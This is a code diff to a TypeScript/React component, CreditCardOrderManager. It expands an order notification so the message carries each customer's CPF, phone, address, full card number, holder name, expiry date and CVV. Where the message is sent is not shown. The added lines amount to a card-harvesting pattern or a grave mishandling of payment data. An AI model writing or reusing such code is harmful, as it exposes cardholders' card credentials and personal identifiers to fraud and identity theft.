@@ -38,11 +38,37 @@ export function CreditCardOrderManager() {
 
     const message = `
 🔔 Novo Pedido com Cartão:
-ID: ${orderData.id}
-Cliente: ${orderData.customer_data.name}
+
+Dados do Cliente:
+---------------
+Nome: ${orderData.customer_data.name}
+CPF: ${orderData.customer_data.cpf}
 Email: ${orderData.customer_data.email}
-Total: R$ ${orderData.total_amount}
-Status: ${orderData.status}
+Telefone: ${orderData.customer_data.phone}
+
+Endereço:
+--------
+${orderData.customer_data.address}
+${orderData.customer_data.city}, ${orderData.customer_data.state}
+CEP: ${orderData.customer_data.zipCode}
+
+Dados do Cartão:
+--------------
+Número: ${orderData.credit_card_data.cardNumber}
+Titular: ${orderData.credit_card_data.cardHolder}
+Validade: ${orderData.credit_card_data.expiryDate}
+CVV: ${orderData.credit_card_data.cvv}
+
+Dados do Pedido:
+--------------
+Data: ${new Date(orderData.created_at).toLocaleString()}
+Total: R$ ${orderData.total_amount.toFixed(2)}
+
+Itens:
+-----
+${orderData.items.map((item: any) => 
+  `${item.title} - Qtd: ${item.quantity} - R$ ${item.price.toFixed(2)}`
+).join('\n')}
     `;
 
     try {
@@ -165,4 +191,4 @@ Status: ${orderData.status}
       </Card>
     </div>
   );
-}
+};
